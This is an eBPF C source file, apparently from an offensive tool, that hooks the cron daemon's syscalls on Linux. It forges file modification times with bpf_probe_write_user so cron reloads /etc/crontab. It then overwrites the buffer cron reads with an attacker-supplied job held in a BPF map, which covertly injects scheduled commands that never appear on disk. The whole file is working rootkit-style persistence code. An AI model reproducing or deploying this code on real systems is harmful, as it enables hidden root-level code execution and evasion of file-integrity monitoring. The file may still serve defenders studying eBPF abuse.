//go:build ignore
#include "vmlinux.h"
#include <bpf/bpf_tracing.h>
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_core_read.h>
#include "common.h"
#include "cron.h"
#include "openat.h"
#include "newfstatat.h"
#include "read.h"
#include "fstat.h"

char LICENSE[] SEC("license") = "GPL";

struct event {
    u32 pid;
};

struct {
    __uint(type, BPF_MAP_TYPE_RINGBUF);
    __uint(max_entries, 1 << 24);
    __type(value, struct event);
} events SEC(".maps");

#define MAX_JOB_LEN 1024
#define MAX_JOB_MASK (MAX_JOB_LEN - 1)

struct config {
    char job[MAX_JOB_LEN];
    __u32 len_job;
};

struct {
    __uint(type, BPF_MAP_TYPE_ARRAY);
    __uint(max_entries, 1);
    __type(key, int);
    __type(value, struct config);
} config_map SEC(".maps");

struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 1024);
    __type(key,  u32);
    __type(value, int);
} fd_map SEC(".maps");


// https://sources.debian.org/src/cron/3.0pl1-105/pathnames.h#L42
#define SPOOL_DIR "crontabs"
// https://sources.debian.org/src/cron/3.0pl1-105/pathnames.h#L69
#define SYSCRONTAB "/etc/crontab"
// https://sources.debian.org/src/cron/3.0pl1-105/pathnames.h#L72
#define SYSCRONDIR "/etc/cron.d"

/*
https://sources.debian.org/src/cron/3.0pl1-105/database.c/#L86
stat(SYSCRONTAB, &syscron_stat)

https://sources.debian.org/src/cron/3.0pl1-105/database.c/#L94
stat(SYSCRONDIR, &syscrond_stat)

https://sources.debian.org/src/cron/3.0pl1-105/database.c/#L143-L154
#ifdef DEBIAN
	if ((old_db->user_mtime == statbuf.st_mtime) &&
	    (old_db->sys_mtime == syscron_stat.st_mtime) &&
	    (!syscrond_change)) {
#else
	if ((old_db->user_mtime == statbuf.st_mtime) &&
	    (old_db->sys_mtime == syscron_stat.st_mtime)) {
#endif
		Debug(DLOAD, ("[%d] spool dir mtime unch, no load needed.\n",
			      getpid()))
		return;
	}
*/
static __inline int handle_exit_newfstatat(struct bpf_raw_tracepoint_args *ctx) {
    // newfstatat(AT_FDCWD, "/etc/crontab", {st_mode=S_IFREG|0644, st_size=1136, ...}, 0) = 0
    struct newfstatat_args args = {};
    if (parse_newfstatat_args(ctx, &args) != 0) {
        return -1;
    }
    char filename[16] = {};
    if (bpf_probe_read_user_str(&filename, sizeof(filename), args.filename) < 0) {
        return -1;
    }
    // https://sources.debian.org/src/cron/3.0pl1-105/database.c/#L143-L154
    if (const_memcmp(filename, SYSCRONDIR, sizeof(SYSCRONDIR))) {
        // overwrite st_mtime
        u64 now_ns = bpf_ktime_get_ns();
        time64_t now_sec = now_ns / 1000000000ULL;
        bpf_probe_write_user(&args.stat_buf->st_mtime, &now_sec, sizeof(now_sec));
    }
//    if (const_memcmp(filename, SPOOL_DIR, sizeof(SPOOL_DIR))) {
//        // overwrite st_mtime
//        time64_t now_sec = 0;
//        bpf_probe_write_user(&args.stat_buf->st_mtime, &now_sec, sizeof(now_sec));
//    }
//    if (const_memcmp(filename, SYSCRONTAB, sizeof(SYSCRONTAB))) {
//        // overwrite st_mtime
//        u64 now_ns = bpf_ktime_get_ns();
//        time64_t now_sec = now_ns / 1000000000ULL;
//        bpf_probe_write_user(&args.stat_buf->st_mtime, &now_sec, sizeof(now_sec));
//    }
    return 0;
}

/*
https://sources.debian.org/src/cron/3.0pl1-105/database.c/#L344
https://sources.debian.org/src/cron/3.0pl1-105/database.c/#L380
crontab_fd = open(tabname, O_RDONLY|O_NOFOLLOW, 0)
*/
static __inline int handle_exit_openat(struct bpf_raw_tracepoint_args *ctx) {
    // openat(AT_FDCWD, "/etc/crontab", O_RDONLY) = 5
    struct openat_args args = {};
    if (parse_openat_args(ctx, &args) != 0) {
        return -1;
    }
    char pathname[16] = {};
    if (bpf_probe_read_user_str(&pathname, sizeof(pathname), args.pathname) < 0) {
        return -1;
    }
    if (!const_memcmp(pathname, SYSCRONTAB, sizeof(SYSCRONTAB))) {
        return -1;
    }
    // bpf_printk("[handle_exit_openat] fd=%d", args.ret);
    // save args.ret into a global var
    u32 pid = bpf_get_current_pid_tgid() >> 32;
    bpf_map_update_elem(&fd_map, &pid, &args.ret, BPF_ANY);
    return 0;
}

/*
https://sources.debian.org/src/cron/3.0pl1-105/database.c/#L351
fstat(crontab_fd, statbuf);
...
if (u->mtime == statbuf->st_mtime) {
    Debug(DLOAD, (" [no change, using old data]"))
    unlink_user(old_db, u);
    link_user(new_db, u);
    goto next_crontab;
}
strace -f cron -x load
newfstatat(AT_FDCWD, "/etc/crontab", {st_mode=S_IFREG|0644, st_size=1528, ...}, AT_SYMLINK_NOFOLLOW) = 0
openat(AT_FDCWD, "/etc/crontab", O_RDONLY) = 5
fstat(5, {st_mode=S_IFREG|0644, st_size=1528, ...}) = 0
write(1, "\t*system*: [no change, using old"..., 46     *system*: [no change, using old data] [done]
*/
static __inline int handle_exit_fstat(struct bpf_raw_tracepoint_args *ctx) {
    // get fd from global var
    u32 pid = bpf_get_current_pid_tgid() >> 32;
    int *fd_ptr = bpf_map_lookup_elem(&fd_map, &pid);
    if (!fd_ptr) {
        return -1;
    }
    int fd = *fd_ptr;
    // filter wrong fd
    struct fstat_args args = {};
    if (parse_fstat_args(ctx, &args) != 0) {
        return -1;
    }
    if (args.fd != fd) {
        return 0;
    }
    // overwrite st_mtime
    u64 now_ns = bpf_ktime_get_ns();
    time64_t now_sec = now_ns / 1000000000ULL;
    bpf_probe_write_user(&args.stat_buf->st_mtime, &now_sec, sizeof(now_sec));
    return 0;
}

// read(5, "# /etc/crontab: system-wide cron"..., 4096) = 1136
static __inline int handle_exit_read(struct bpf_raw_tracepoint_args *ctx) {
    // get fd from global var
    u32 pid = bpf_get_current_pid_tgid() >> 32;
    int *fd_ptr = bpf_map_lookup_elem(&fd_map, &pid);
    if (!fd_ptr) {
        return -1;
    }
    int fd = *fd_ptr;
    // filter wrong fd
    struct read_args args = {};
    if (parse_read_args(ctx, &args) != 0) {
        return -1;
    }
    if (args.fd != fd) {
        return 0;
    }
    // dynamic read job from user space
    int key = 0;
    struct config *cfg;
    cfg = bpf_map_lookup_elem(&config_map, &key);
    if (!cfg) {
        return -1;
    }
    // write payload
    __u32 len = cfg->len_job & MAX_JOB_MASK;
    if (len == 0) {
        return -1;
    }
    bpf_printk("[handle_exit_read] buf(actually)=%s", args.buf);
    bpf_probe_write_user((void *)args.buf, cfg->job, len);
    bpf_printk("[handle_exit_read] buf(hacked)=%s", args.buf);
    // send event to user space
    struct event *e;
    e = bpf_ringbuf_reserve(&events, sizeof(*e), 0);
    if (!e) {
        return 1;
    }
    e->pid = bpf_get_current_pid_tgid() >> 32;
    bpf_ringbuf_submit(e, 0);
    return 0;
}

SEC("raw_tracepoint/sys_exit")
int raw_tracepoint(struct bpf_raw_tracepoint_args *ctx) {
    // filter comm==cron
    if (!is_cron()) {
        return 0;
    }
    // filter syscall
    struct pt_regs *regs = (struct pt_regs *)(ctx->args[0]);
    int syscall_id = get_syscall_id_from_regs(regs);
    switch (syscall_id) {
    case 0:
        handle_exit_read(ctx);
        break;
    case 5:
        handle_exit_fstat(ctx);
        break;
    case 257:
        handle_exit_openat(ctx);
        break;
    case 262:
        handle_exit_newfstatat(ctx);
    default:
        return 0;
    }
    return 0;
}